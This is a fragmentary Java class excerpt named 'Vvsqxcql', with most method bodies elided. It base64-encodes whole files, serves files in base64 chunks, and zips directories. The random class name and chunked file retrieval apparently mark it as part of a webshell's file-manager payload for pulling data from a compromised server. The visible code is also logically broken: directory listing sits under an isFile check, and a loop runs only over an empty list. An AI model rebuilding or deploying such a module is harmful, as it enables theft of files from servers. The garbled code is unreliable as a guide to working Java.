...
public class Vvsqxcql {
    ...
    private String show() throws Exception {
        ...
        return Vvsqxcql.base64encode(fileContent);
    }
    ...
    private String downloadPart(String path, long blockIndex, long blockSize) throws Exception {
        ...
        return Vvsqxcql.base64encode(Arrays.copyOfRange(content, 0, size));
    }
    ...
    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
        ...
        try {
            ...
            Vvsqxcql.compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
        ...
        if (sourceFile.isFile()) {
            ...
            if (listFiles == null || listFiles.length == 0) {
                ...
                for (File file : listFiles) {
                    if (KeepDirStructure) {
                        Vvsqxcql.compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
                        continue;
                    }
                    Vvsqxcql.compress(file, zos, file.getName(), KeepDirStructure);
                }
            }
        }
    }
